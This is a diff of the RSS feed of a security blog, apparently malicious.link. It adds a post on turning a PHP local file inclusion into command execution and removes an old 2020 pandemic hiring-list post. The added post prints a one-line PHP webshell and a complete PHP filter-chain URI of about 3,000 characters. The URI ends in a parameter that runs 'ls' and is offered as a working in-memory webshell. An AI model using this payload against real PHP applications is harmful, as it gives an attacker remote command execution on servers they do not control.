@@ -5,10 +5,27 @@
     <description>Recent content in Posts on malicious.link</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 22 Jun 2022 04:00:00 -0500</lastBuildDate>
+    <lastBuildDate>Sun, 16 Apr 2023 04:00:00 -0500</lastBuildDate>
     
         <atom:link href="https://malicious.link/post/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Simple PHP webshell with php filter chains</title>
+      <link>https://malicious.link/post/2023/simple-php-webshell-with-php-filter-chains/</link>
+      <pubDate>Sun, 16 Apr 2023 04:00:00 -0500</pubDate>
+      
+      <guid>https://malicious.link/post/2023/simple-php-webshell-with-php-filter-chains/</guid>
+      <description>&lt;p&gt;Recently found an LFI in a PHP application and one of the cool things I learned about recently was &lt;a href=&#34;https://github.com/synacktiv/php_filter_chain_generator&#34;&gt;PHP filter chains&lt;/a&gt;. More info here: &lt;a href=&#34;https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html&#34;&gt;https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;However, if you are using this in a URL, it&amp;rsquo;s pretty hard to do anything too complicated since it expands the text to the point where web servers won&amp;rsquo;t accept the URL anymore (8190 characters is default max in Apache).&lt;/p&gt;
+&lt;p&gt;So I used this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?=`$_GET[0]`?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From: &lt;a href=&#34;https://github.com/bayufedra/Tiny-PHP-Webshell&#34;&gt;https://github.com/bayufedra/Tiny-PHP-Webshell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Which resulted in the following 3036 character URI ending in a &lt;code&gt;&amp;amp;0=ls&lt;/code&gt; which executed the command &lt;code&gt;ls&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;amp;0=ls
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This results in a in-memory (not sure if it writes to a temp file with php://temp) php webshell.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Beautiful Basics: Lesson 4</title>
@@ -1574,21 +1591,6 @@ using this Ansible script: &lt;a href=&#34;https://gitlab.com/mubix/letmeoutofyo
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Test SSH&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    executor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit(check_ssh, domain, port)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
-    </item>
-    
-    <item>
-      <title>2020 Pandemic SIP Hiring List</title>
-      <link>https://malicious.link/post/2020/2020-pandemic-hiring-list/</link>
-      <pubDate>Fri, 27 Mar 2020 09:30:44 -0500</pubDate>
-      
-      <guid>https://malicious.link/post/2020/2020-pandemic-hiring-list/</guid>
-      <description>&lt;p&gt;One of the hard things about this pandemic is many people are either losing their jobs or having a hard time finding a new one in general. It was suggested that I make one of these during this time. So, here it is.&lt;/p&gt;
-&lt;h3 id=&#34;only-post-if-you-can-remote-interview-and-remote-hire-for-remote-work&#34;&gt;ONLY POST IF YOU CAN REMOTE INTERVIEW AND REMOTE HIRE FOR REMOTE WORK&lt;/h3&gt;
-&lt;p&gt;The 2020 Unofficial Pandemic Shelter-In-Place Hiring List. To get on the list is just complete the following form: &lt;a href=&#34;https://forms.gle/kXWTKBEE4s6h9aPT7&#34;&gt;https://forms.gle/kXWTKBEE4s6h9aPT7&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;
-&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1g66yBwTDsqoPQbkak7yHRJ4HzX3-AxnVAOnBCcshb0c/&#34;&gt;https://docs.google.com/spreadsheets/d/1g66yBwTDsqoPQbkak7yHRJ4HzX3-AxnVAOnBCcshb0c/&lt;/a&gt;&lt;/p&gt;
-&lt;iframe height=&#34;2000&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vTZMqdNg1-_q5ySibaRf8KSPZS42buCPvIQq6Nk-QA6vHB1QmcuC-7dU9xgpMTcJTMyWc_GRNffh_3o/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
-</description>
     </item>
     
   </channel>
